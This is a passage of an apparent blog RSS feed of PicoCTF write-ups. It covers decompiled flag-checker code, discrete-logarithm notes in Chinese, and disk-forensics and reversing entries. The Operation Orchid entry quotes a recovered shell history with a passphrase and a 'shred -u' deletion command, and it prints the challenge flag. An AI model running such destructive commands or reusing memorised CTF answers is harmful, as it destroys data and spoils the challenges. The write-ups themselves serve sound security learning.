 char v111; // [rsp+C0h] [rbp-148h] BYREF
 char v112[15]; // [rsp+150h] [rbp-B8h] BYREF
 __int128 v113; // [rsp+160h] [rbp-A8h]
 __int128 v115[4]; // [rsp+180h] [rbp-88h] BYREF
 char v116; // [rsp+1C0h] [rbp-48h] BYREF
 unsigned __int64 v117; // [rsp+1C8h] [rbp-40h]

 v117 = __readfsqword(0x28u);
 puts(&amp;#34;I heard you wanted to bargain for a flag... whatcha got?&amp;#34;);
 __asm { vmovdqa xmm0, cs:xmmword_21A0 }
 v4 = &amp;amp;v110;
 v5 = -104;
 v6 = 50;
 v7 = 108;
 v8 = 28;
 __asm { vmovdqa [rsp+208h+var_158], xmm0 }
 v9 = 4;
 do
 {
 if ( (v9 &amp;amp; 3) == 0 )
 {
 v10 = byte_20A0[v6];
 v6 = byte_20A0[v7];
 v7 = byte_20A0[v8];
 v8 = byte_20A0[v5];
 v5 = byte_2080[v9 &amp;gt;&amp;gt; 2] ^ v10;
 }
 v5 ^= *v4;
 ++v9;
 v4 = (v4 + 4);
 v6 ^= *(v4 - 3);
 v7 ^= *(v4 - 2);
 v8 ^= *(v4 - 1);
 *(v4 + 12) = v5;
 *(v4 + 13) = v6;
 *(v4 + 14) = v7;
 *(v4 + 15) = v8;
 }
 while ( v9 != 44 );
 __asm
 {
 vmovdqa xmm0, cs:xmmword_21B0
 vmovdqa [rsp+208h+var_A8], xmm0
 }
 fread(ptr, 1uLL, 0x40uLL, stdin);
 __asm
 {
 vmovdqa xmm0, cs:xmmword_21C0
 vmovdqa [rsp+208h+var_88], xmm0
 vmovdqa xmm0, cs:xmmword_21D0
 }
 v108 = v110;
 __asm
 {
 vmovdqa [rsp+208h+var_78], xmm0
 vmovdqa xmm0, cs:xmmword_21E0
 vmovdqa [rsp+208h+var_68], xmm0
 vmovdqa xmm0, cs:xmmword_21F0
 vmovdqa [rsp+208h+var_58], xmm0
 }
 v100 = v112[0];
 v101 = v112[2];
 v102 = v112[4];
 v103 = v112[6];
 v104 = v112[8];
 v105 = v112[10];
 v106 = v112[12];
 v107 = v112[14];
 v98 = v115;
 v16 = 16;
 do
 {
 if ( v16 == 16 )
 {
 v20 = &amp;amp;v111;
 __asm { vmovdqa xmm4, [rsp+208h+var_A8] }
 LOBYTE(v87) = byte_20A0[(v113 ^ v108)];
 __asm { vpextrb rax, xmm4, 4 }
 LOBYTE(v86) = byte_20A0[(BYTE4(v108) ^ _RAX)];
 v94 = byte_20A0[BYTE8(v113) ^ BYTE8(v108)];
 __asm { vpextrb rax, xmm4, 0Ch }
 v93 = byte_20A0[(BYTE12(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 1 }
 v25 = byte_20A0[(BYTE1(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 5 }
 v85 = byte_20A0[(BYTE5(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 9 }
 v84 = byte_20A0[(BYTE9(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 0Dh }
 v92 = byte_20A0[(BYTE13(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 2 }
 LOBYTE(v30) = byte_20A0[(BYTE2(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 6 }
 v32 = byte_20A0[(BYTE6(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 0Ah }
 v91 = byte_20A0[(BYTE10(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 0Eh }
 v96 = v32;
 v88 = v25;
 v90 = byte_20A0[(BYTE14(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 3 }
 v36 = byte_20A0[(BYTE3(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 7 }
 v95 = v36;
 v38 = byte_20A0[(BYTE7(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 0Bh }
 v40 = byte_20A0[(BYTE11(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 0Fh }
 v89 = byte_20A0[(HIBYTE(v108) ^ _RAX)];
 do
 {
 v42 = v91 ^ v89 ^ v87 ^ v85;
 v99 = v87 ^ v89;
 v43 = v90 ^ v95 ^ v86 ^ v84;
 v97 = v30 ^ v38 ^ v94 ^ v92;
 v44 = v40 ^ v96 ^ v93 ^ v88;
 v45 = ((2 * (v86 ^ v95)) ^ (27 * ((v86 ^ v95) &amp;gt;&amp;gt; 7)) ^ v95 ^ v43 ^ v20[7]);
 v46 = v20[10] ^ v97 ^ v30 ^ (27 * ((v30 ^ v38) &amp;gt;&amp;gt; 7)) ^ (2 * (v30 ^ v38));
 v47 = v20[11] ^ v97 ^ v38 ^ (2 * (v38 ^ v94)) ^ (27 * ((v38 ^ v94) &amp;gt;&amp;gt; 7));
 v48 = v88 ^ v44 ^ v20[13] ^ (2 * (v88 ^ v96)) ^ (27 * ((v88 ^ v96) &amp;gt;&amp;gt; 7));
 v49 = v96 ^ v44 ^ v20[14] ^ (27 * ((v40 ^ v96) &amp;gt;&amp;gt; 7)) ^ (2 * (v40 ^ v96));
 v50 = v44 ^ v20[15] ^ v40 ^ (2 * (v40 ^ v93)) ^ (27 * ((v40 ^ v93) &amp;gt;&amp;gt; 7));
 LOBYTE(v87) = byte_20A0[((2 * (v87 ^ v85)) ^ (27 * ((v87 ^ v85) &amp;gt;&amp;gt; 7)) ^ v42 ^ *v20 ^ v87)];
 LOBYTE(v86) = byte_20A0[((2 * (v86 ^ v84)) ^ (27 * ((v86 ^ v84) &amp;gt;&amp;gt; 7)) ^ v86 ^ v43 ^ v20[4])];
 v94 = byte_20A0[((2 * (v94 ^ v92)) ^ (27 * ((v94 ^ v92) &amp;gt;&amp;gt; 7)) ^ v94 ^ v97 ^ v20[8])];
 v93 = byte_20A0[((27 * ((v93 ^ v88) &amp;gt;&amp;gt; 7)) ^ (2 * (v93 ^ v88)) ^ v93 ^ v20[12] ^ v44)];
 v88 = byte_20A0[((2 * (v85 ^ v91)) ^ (27 * ((v85 ^ v91) &amp;gt;&amp;gt; 7)) ^ v85 ^ v42 ^ v20[1])];
 v85 = byte_20A0[((27 * ((v84 ^ v90) &amp;gt;&amp;gt; 7)) ^ (2 * (v84 ^ v90)) ^ v84 ^ v43 ^ v20[5])];
 v84 = byte_20A0[((27 * ((v30 ^ v92) &amp;gt;&amp;gt; 7)) ^ (2 * (v30 ^ v92)) ^ v20[9] ^ v97 ^ v92)];
 v92 = byte_20A0[v48];
 v51 = v91 ^ v42 ^ v20[2];
 v20 += 16;
 v30 = byte_20A0[((2 * (v91 ^ v89)) ^ (27 * ((v91 ^ v89) &amp;gt;&amp;gt; 7)) ^ v51)];
 v96 = byte_20A0[((27 * ((v90 ^ v95) &amp;gt;&amp;gt; 7)) ^ (2 * (v90 ^ v95)) ^ v43 ^ *(v20 - 10) ^ v90)];
 v91 = byte_20A0[v46];
 v90 = byte_20A0[v49];
 v40 = byte_20A0[v47];
 v38 = byte_20A0[v45];
 v95 = byte_20A0[((27 * (v99 &amp;gt;&amp;gt; 7)) ^ (2 * v99) ^ v89 ^ v42 ^ *(v20 - 13))];
 v89 = byte_20A0[v50];
 }
 while ( v112 != v20 );
 LOBYTE(v30) = v105 ^ v30;
 LOBYTE(v87) = v100 ^ v87;
 _R15D = v30;
 __asm { vmovd xmm5, r15d }
 v54 = v86;
 LOBYTE(v86) = v103 ^ v90;
 _R9D = (v101 ^ v91);
 _R10D = (v102 ^ v54);
 _EDX = (v107 ^ v96);
 _R13D = (v104 ^ v94);
 __asm
 {
 vmovd xmm4, edx
 vmovd xmm7, r9d
 vpinsrb xmm5, xmm5, ebx, 1
 vmovd xmm3, r10d
 }
 v63 = 15LL;
 _ESI = (v106 ^ v93);
 __asm
 {
 vmovd xmm1, r13d
 vmovd xmm0, [rsp+208h+var_1F8]
 vmovd xmm6, [rsp+208h+var_1FC]
 vpinsrb xmm7, xmm7, [rsp+208h+var_1FD], 1
 vpinsrb xmm0, xmm0, eax, 1
 vpinsrb xmm1, xmm1, r11d, 1
 vpunpcklwd xmm0, xmm0, xmm7
 }
 v72 = HIBYTE(v113);
 __asm
 {
 vpinsrb xmm3, xmm3, [rsp+208h+var_1FE], 1
 vpinsrb xmm6, xmm6, [rsp+208h+var_1F4], 1
 vpunpcklwd xmm1, xmm1, xmm5
 vpunpcklwd xmm3, xmm3, xmm6
 vmovd xmm2, esi
 vpunpckldq xmm0, xmm0, xmm3
 vpinsrb xmm2, xmm2, r8d, 1
 vpinsrb xmm4, xmm4, ecx, 1
 vpunpcklwd xmm2, xmm2, xmm4
 vpunpckldq xmm1, xmm1, xmm2
 vpunpcklqdq xmm0, xmm0, xmm1
 vmovdqa [rsp+208h+var_98], xmm0
 }
 if ( HIBYTE(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE14(v113);
 HIBYTE(v113) = 0;
 v63 = 14LL;
 if ( BYTE14(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE13(v113);
 BYTE14(v113) = 0;
 v63 = 13LL;
 if ( BYTE13(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE12(v113);
 BYTE13(v113) = 0;
 v63 = 12LL;
 if ( BYTE12(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE11(v113);
 BYTE12(v113) = 0;
 v63 = 11LL;
 if ( BYTE11(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE10(v113);
 BYTE11(v113) = 0;
 v63 = 10LL;
 if ( BYTE10(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE9(v113);
 BYTE10(v113) = 0;
 v63 = 9LL;
 if ( BYTE9(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE8(v113);
 BYTE9(v113) = 0;
 v63 = 8LL;
 if ( BYTE8(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE7(v113);
 BYTE8(v113) = 0;
 v63 = 7LL;
 if ( BYTE7(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE6(v113);
 BYTE7(v113) = 0;
 v63 = 6LL;
 if ( BYTE6(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE5(v113);
 BYTE6(v113) = 0;
 v63 = 5LL;
 if ( BYTE5(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE4(v113);
 BYTE5(v113) = 0;
 v63 = 4LL;
 if ( BYTE4(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE3(v113);
 BYTE4(v113) = 0;
 v63 = 3LL;
 if ( BYTE3(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE2(v113);
 BYTE3(v113) = 0;
 v63 = 2LL;
 if ( BYTE2(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE1(v113);
 BYTE2(v113) = 0;
 v63 = 1LL;
 if ( BYTE1(v113) == 0xFF &amp;amp;&amp;amp; (v72 = v113, BYTE1(v113) = 0, v63 = 0LL, v113 == 0xFF) )
 {
 LOBYTE(v113) = 0;
 v16 = 0;
 }
 else
 {
LABEL_14:
 *(&amp;amp;v113 + v63) = v72 + 1;
 v16 = 0;
 }
 }
 v17 = v16++;
 *v98++ ^= *(&amp;amp;v115[-1] + v17);
 }
 while ( &amp;amp;v116 != v98 );
 v18 = memcmp(v115, ptr, 0x40uLL);
 if ( v18 )
 {
 v18 = 1;
 puts(&amp;#34;Nope, come back later&amp;#34;);
 }
 else
 {
 puts(&amp;#34;Yep, that&amp;#39;s it!&amp;#34;);
 }
 return v18;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - notepad</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---notepad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---notepad/</guid><description>&lt;h1 id="picoctf---notepad">
 PicoCTF - notepad
 &lt;a class="anchor" href="#picoctf---notepad">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@shaoeChen/BkApyHhgf?type=view">Flask實作_基礎_03_簡述url_for與route&lt;/a>
&lt;a href="https://tedboy.github.io/flask/generated/werkzeug.url_fix.html">werkzeug.url_fix&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>PicoCTF - NSA Backdoor</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---nsa-backdoor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---nsa-backdoor/</guid><description>&lt;h1 id="picoctf---nsa-backdoor">
 PicoCTF - NSA Backdoor
 &lt;a class="anchor" href="#picoctf---nsa-backdoor">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.csdn.net/ACdreamers/article/details/8579511">Baby Step Giant Step - BSGS&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>用来解决如下方程最小正整數解的
$A^x\equiv B(mod\ C)$，其中$0\le x\lt C$
如果$A\ge C, B\ge C$，那麼我們可以先取模，即$A% = C, B% = C$，所以在這裡我們只討論$0\le A, B\lt C$的情況。
普通的BSGS的步驟是這樣的：&lt;/p>
&lt;ol>
&lt;li>首先確定$x$的下限是$0$，上限是$C$，我們令$M=\lceil C\rceil$&lt;/li>
&lt;li>把$A^0~A^M\ mod\ C$的值存到一个Hash表裡面&lt;/li>
&lt;li>把$(A^M)^0~(A^M)^M\ mod\ C$的值一一枚舉出來，每枚舉一個就在Hash表裡面尋找是否有一個$val$值滿足$val \cdot (A^M)^i\ mod\ C=B$，如果有則找到答案，否則繼續&lt;/li>
&lt;li>最終答案就是$i\cdot M+val$的值對應的原來$A$的冪
上面是普通Baby Step Giant Step的步驟，比較簡單，只適用為素數的情況。如果為合數呢？&lt;/li>
&lt;/ol>&lt;/blockquote>
&lt;p>拓展的過程詳見全文&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://blog.csdn.net/oampamp1/article/details/104061969">離散對數問題 - pohlig-hellman算法講解&lt;/a>&lt;/p>
&lt;blockquote>
&lt;ol>
&lt;li>
&lt;p>需要注意的是，pohlig-hellman算法的覆雜度在一般情況下比BSGS高！
因此，使用pohlig-hellman的場合只能是較為特殊的情況，即:$p$是質數，且$p-1$包含的質因子較少&amp;amp;較小。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>和BSGS算法一樣，pohlig-hellman算法也是用於解決離散對數問題（也有很多文獻提到是解決橢圓曲線之類的）。即給定$a,b,p$,求 $a^x \equiv b(mod\ p)$。&lt;/p></description></item><item><title>PicoCTF - Operation Oni</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---operation-oni/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---operation-oni/</guid><description>&lt;h1 id="picoctf---operation-oni">
 PicoCTF - Operation Oni
 &lt;a class="anchor" href="#picoctf---operation-oni">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.techrepublic.com/article/how-to-view-your-ssh-keys-in-linux-macos-and-windows/">How to View Your SSH Keys in Linux, macOS and Windows&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://docs.pingcode.com/ask/16621.html">ISO和IMG有哪些區別&lt;/a>&lt;/p>
&lt;blockquote>
&lt;h3 id="iso和img的區別">
 ISO和IMG的區別
 &lt;a class="anchor" href="#iso%e5%92%8cimg%e7%9a%84%e5%8d%80%e5%88%a5">#&lt;/a>
&lt;/h3>
&lt;p>ISO和IMG都是操作系統鏡像文件的擴展名，它們的主要區別在以下幾個方面：&lt;/p>
&lt;ol>
&lt;li>來源不同
ISO文件通常來自光盤鏡像，例如Windows安裝光盤的ISO鏡像文件。而IMG文件可以來自多種渠道，例如從移動設備制造商下載的Android操作系統鏡像文件，或者是從虛擬機軟件中制作的虛擬機磁盤鏡像文件。&lt;/li>
&lt;li>文件格式不同
ISO文件使用ISO 9660標準格式，而IMG文件可以使用多種格式，例如RAW、VMDK、VDI等。&lt;/li>
&lt;li>兼容性不同
ISO文件在各種操作系統和軟件中都有良好的兼容性，而IMG文件在一些操作系統或軟件中可能存在兼容性問題。&lt;/li>
&lt;li>使用範圍不同
ISO文件主要用於制作光盤或者USB啟動盤，用於安裝操作系統或者救援系統等。而IMG文件主要用於移動設備或者虛擬機等環境下的操作系統安裝或備份。
總之，ISO和IMG都是操作系統鏡像文件的擴展名，雖然它們在一些方面有類似之處，但在來源、文件格式、兼容性和使用範圍等方面存在差異，應根據具體的需求來選擇使用哪種格式。&lt;/li>
&lt;/ol>&lt;/blockquote>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;p>Download this disk image, find the key and log into the remote machine. Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.&lt;/p></description></item><item><title>PicoCTF - Operation Orchid</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---operation-orchid/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---operation-orchid/</guid><description>&lt;h1 id="picoctf---operation-orchid">
 PicoCTF - Operation Orchid
 &lt;a class="anchor" href="#picoctf---operation-orchid">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題過於簡單&lt;/p>
&lt;h2 id="exploit---forensics--openssl">
 Exploit - Forensics / Openssl
 &lt;a class="anchor" href="#exploit---forensics--openssl">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Find Encryption Flag File(Autopsy)
可以在/root中找到，然後.ash_history的command紀錄中知道加密的password phrase
&lt;img src="https://hackmd.io/_uploads/rJdlBhLgp.png" alt="" />&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>touch flag.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nano flag.txt 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apk get nano
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apk --help
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apk add nano
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nano flag.txt 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>openssl
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>openssl aes256 -salt -in flag.txt -out flag.txt.enc -k unbreakablepassword1234567
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>shred -u flag.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ls -al
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>halt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Script&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ openssl aes-256-cbc -in flag.txt.enc -d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>enter aes-256-cbc decryption password:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*** WARNING : deprecated key derivation used.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Using -iter or -pbkdf2 would be better.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bad decrypt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>140342062343488:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:crypto/evp/evp_enc.c:612:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>picoCTF&lt;span style="color:#f92672">{&lt;/span>h4un71ng_p457_5113beab&lt;span style="color:#f92672">}&lt;/span>%
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></description></item><item><title>PicoCTF - OTP Implementation</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---otp-implementation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---otp-implementation/</guid><description>&lt;h1 id="picoctf---otp-implementation">
 PicoCTF - OTP Implementation
 &lt;a class="anchor" href="#picoctf---otp-implementation">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> v4; &lt;span style="color:#75715e">// al
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v5; &lt;span style="color:#75715e">// dl
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v6; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+18h] [rbp-E8h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> j; &lt;span style="color:#75715e">// [rsp+1Ch] [rbp-E4h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> input_key[&lt;span style="color:#ae81ff">112&lt;/span>]; &lt;span style="color:#75715e">// [rsp+20h] [rbp-E0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> tmp_key[&lt;span style="color:#ae81ff">104&lt;/span>]; &lt;span style="color:#75715e">// [rsp+90h] [rbp-70h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v11; &lt;span style="color:#75715e">// [rsp+F8h] [rbp-8h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> __readfsqword(&lt;span style="color:#ae81ff">0x28u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( argc &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> strncpy(input_key, argv[&lt;span style="color:#ae81ff">1&lt;/span>], &lt;span style="color:#ae81ff">0x64uLL&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> input_key[&lt;span style="color:#ae81ff">100&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; valid_char(input_key[i]); &lt;span style="color:#f92672">++&lt;/span>i )&lt;span style="color:#75715e">// 確認字元是否在[0-9|a-f]之間
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> jumble(input_key[i]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> tmp_key[i &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> ((tmp_key[i &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">31&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_key[i] &lt;span style="color:#f92672">=&lt;/span> ((v6 &lt;span style="color:#f92672">+&lt;/span> v5) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xF&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> v6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_key[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> jumble(input_key[&lt;span style="color:#ae81ff">0&lt;/span>]) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; j &lt;span style="color:#f92672">&amp;lt;&lt;/span> i; &lt;span style="color:#f92672">++&lt;/span>j )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_key[j] &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">0x61&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( i &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>strncmp(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_key,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;bajbgfapbcclgoejgpakmdilalpomfdlkngkhaljlcpkjgndlgmpdgmnmepfikanepopbapfkdgleilhkfgilgabldofbcaedgfe&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">100uLL&lt;/span>) )
